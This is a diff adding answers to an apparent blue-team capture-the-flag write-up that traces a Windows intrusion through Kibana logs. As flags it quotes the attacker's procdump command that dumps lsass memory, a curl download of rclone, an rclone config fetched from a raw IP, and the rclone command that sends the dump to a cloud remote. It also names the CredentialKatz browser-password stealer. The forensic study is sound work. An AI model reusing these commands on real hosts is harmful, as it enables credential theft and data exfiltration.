@@ -105,22 +105,184 @@ We go back to [Exfil_05](#exfil_05) and use the same search with adding `UpdateC
 > Flag:`pd.exe,Updatepd.exe,CredentialKatz.exe`
 
 ## Exfil_13
->
+> What was the file.directory where these files were downloaded?
 
-> Flag:``
+From logs from previous search, we see that all were downloaded to `C:\Users\Public`.
+
+> Flag:`C:\Users\Public`
+
 ## Exfil_14
->
+> Which of the three was executed first?
 
-> Flag:``
+By searching for `process.name:"pd.exe" or process.name:"Updatepd.exe" or process.name:"CredentialKatz.exe" ` we see that first was executed `Updatepd.exe`:
+
+![](img/Exfil/20250203143052.png)
+
+> Flag:`Updatepd.exe`
+
 ## Exfil_15
->
+> What is the process.hash.sha256 of the Updatepd.exe?
 
-> Flag:``
+From previous search, we add `process.hash.sha256` field to the results:
+
+> Flag:`832e55a3d3fc93cb65dc2047e34e3a4b81387b5a88b1bac263eb7d9cb685fbd1`
+
 ## Exfil_16
->
+> This one again looks like priviledge escalation tool, which after some black magic runs another of the downloaded tools - pd.exe - with SYSTEM privileges. What is the full process.command_line to dump memory of the lsass process to file?
 
-> Flag:``
+First we tried looking for all processes that could have `parent.process.name:Updatepd.exe` or `parent.process.pid` matching Updatepd.exe pid, however we did not find anything.
+Next we searched just for `Updatepd.exe` and looked at the last event details that had record for this process name around the time stamp `17:58`:
+
+![](img/Exfil/20250203145515.png)
+
+Then we clicked on `View surrounding documents`:
+
+![](img/Exfil/20250203145606.png)
+
+Which opened following view of surrounding logs. Re-enabling filter for hostname, noticed several logs containing lsass.exe which indicates actions with memory dump.
+
+![](img/Exfil/20250203153824.png)
+
+After checking the log details to confirm it was executed under SYSTEM privileges, we tried to submit the process.command_line and got accepted answer.
+
+> Flag:`C:\Windows\system32\cmd.exe /C C:\Users\Public\pd.exe -accepteula -ma lsass.exe C:\Users\Public\UpdatepdCrash.dmp`
+
 ## Exfil_17
->
+> What is the process.hash.sha256 of the pd.exe?
 
-> Flag:``
+From previous screenshot we look at `pd.exe` with `process.pid:32948` and submit the `process.hash.sha256`
+
+> Flag:`e4ea34a7c2b51982a6c42c6367119f34bec9aeb9a60937836540035583a5b3bc`
+
+## Exfil_18
+> What is the process.pe.original_file_name of the pd.exe?
+
+We open the log details from previous search and look for `process.pe.original_file_name`:
+
+![](img/Exfil/20250203154610.png)
+
+> Flag:`procdump`
+
+## Exfil_19
+> What is the file.name of the memory dump?
+
+From third screenshot in [Exfil_16](#exfil_16) we see that memory dump was saved to `C:\Users\Public\UpdatepdCrash.dmp`.
+
+> Flag:`UpdatepdCrash.dmp`
+
+## Exfil_20
+> Third tool in a row was the tool named CredentialKatz. What was the process.hash.sha256 of this process?
+
+We search for `CredentialKatz.exe` and look for `process.hash.sha256` info:
+
+![](img/Exfil/20250203155114.png)
+
+> Flag:`0753bb2da4e4def8d6be40297dbc68972106829c52217bd9908059f1a1736e01`
+
+## Exfil_21
+> Which parameter of the command line is used to specify browser to target?
+
+Looking at the `process.command_line` field from previous task, we see full command line was `"C:\Users\Public\CredentialKatz.exe" /edge`:
+
+![](img/Exfil/20250203155454.png)
+
+> Flag:`/edge`
+
+## Exfil_22
+> What is the url of github repository hosting CredentialKatz?
+
+Googling `CredentialKatz` we found GitHub repository.
+
+> Flag:`https://github.com/Meckazin/ChromeKatz`
+
+## Exfil_23
+> Based on the description of the repository, we can expect passwords saved in the Edge browser are now in the adversary's hands. But let's get back to the lsass dump. What is the name of the tool used by adversary to exfiltrate it?
+
+We searched for `UpdatepdCrash.dmp` and looked for logs that try to copy the file, found `rclone`:
+
+![](img/Exfil/20250203160238.png)
+
+> Flag:`rclone`
+
+## Exfil_24
+> What was the command used to download rclone and save it on disk?
+
+We tried just searching for `rclone` and lot of logs were returned that had the `process.command_line` that had reference to `revshell.txt` and no much of info in other fields were displaying:
+
+![](img/Exfil/20250203161024.png)
+
+We figured that this means `rclone` was executed from the reverse shell and that command details are in some other field, so we looked at log details of the oldest log and noticed that `powershell.file.script_block_text` contains what we were looking for:
+
+![](img/Exfil/20250203161236.png)
+
+> Flag:`curl https://downloads.rclone.org/v1.69.0/rclone-v1.69.0-windows-amd64.zip -o C:\Users\Public\rclone.zip`
+
+## Exfil_25
+> What is the url from which custom rclone configuration file was downloaded?
+
+From previous taks, we know that `powershell.file.script_block_text` contains info we need, so we filtered `powershell.file.script_block_text:exists` and looked at the Field statistics to see unique commands executed and noticed the custom configuration one:
+
+![](img/Exfil/20250203161901.png)
+
+> Flag:`http://72.21.196.174/rclone.conf`
+
+## Exfil_26
+> What was the command used by adversary to exfiltrate lsass dump?
+
+From previous screenshot we see the answer.
+
+> Flag:`"C:\Users\Public\rclone-v1.69.0-windows-amd64\rclone.exe" copy " C:\Users\Public\UpdatepdCrash.dmp" mega_cloud:/backup --config C:\Users\Public\rclone-v1.69.0-windows-amd64\rclone.conf --log-level ERROR`
+
+## Exfil_27
+> Let's investigate some other adversary's activities. Our security admin identified some traffic to IP address located in Iran. What was the IP address he's seen?
+
+We switched data view to `filebeat-*` and search for `destination.geo.country_name : "Iran"`. Only singe destination IP was found:
+
+![](img/Exfil/20250203162331.png)
+
+> Flag:`2.176.0.9`
+
+## Exfil_28
+> What is the IP subnet it belongs to?
+
+Search the `2.176.0.9` in VirusTotal it will show the subnet:
+
+![](img/Exfil/20250203162509.png)
+
+> Flag:`2.176.0.0/15`
+
+## Exfil_29
+> What is the process.pid of the process communicating with this IP?
+
+We switched data view back to `winlogbeat-*` and search for `destination.ip : 2.176.0.9`
+
+![](img/Exfil/20250203162645.png)
+
+> Flag:`35712`
+
+## Exfil_30
+> What is the file.path of the file downloaded from this IP?
+
+Searched for `process.pid: 35712`:
+
+![](img/Exfil/20250203162904.png)
+
+> Flag:`C:\Users\Public\gimmedat.bat`
+
+## Exfil_31
+> Batch script was used to exfiltrate documents with interesting names. What was the file.name of the first exfiltrated document?
+
+Searching for `gimmedat.bat` and looking at the logs, we see that first document was:
+
+![](img/Exfil/20250203163152.png)
+
+> Flag:`Approval and Funding of a Research Project.docx`
+
+## Exfil_32
+> How many unique documents were exfiltrated?
+
+From previous task that searched for `gimmdat.bat`, added filter for `process.name: curl`, then checked under Field statistics for distinct values of `process.command_line.text`
+
+![](img/Exfil/20250203163358.png)
+
+> Flag:`10`
